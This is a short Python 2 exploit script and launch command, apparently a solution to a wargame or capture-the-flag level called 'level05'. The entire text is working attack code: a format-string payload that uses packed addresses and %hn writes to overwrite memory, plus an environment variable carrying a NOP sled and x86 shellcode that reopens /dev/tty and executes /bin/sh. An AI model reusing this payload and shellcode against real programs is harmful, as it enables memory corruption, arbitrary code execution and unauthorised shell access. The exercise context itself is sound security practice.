import struct
addr = struct.pack("I", 0x80497e0)
addr2 = struct.pack("I", 0x80497e2)
padding = "%04x %04x %04x %04x %04x %04x %04x %.47590d %010x %hn %.17875d %hn"
print addr + "WWWW" + addr2 + padding 
print addr + "WWWW" + addr2 + padding 

final command : $(python exp.py ; cat) | env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')" ./level05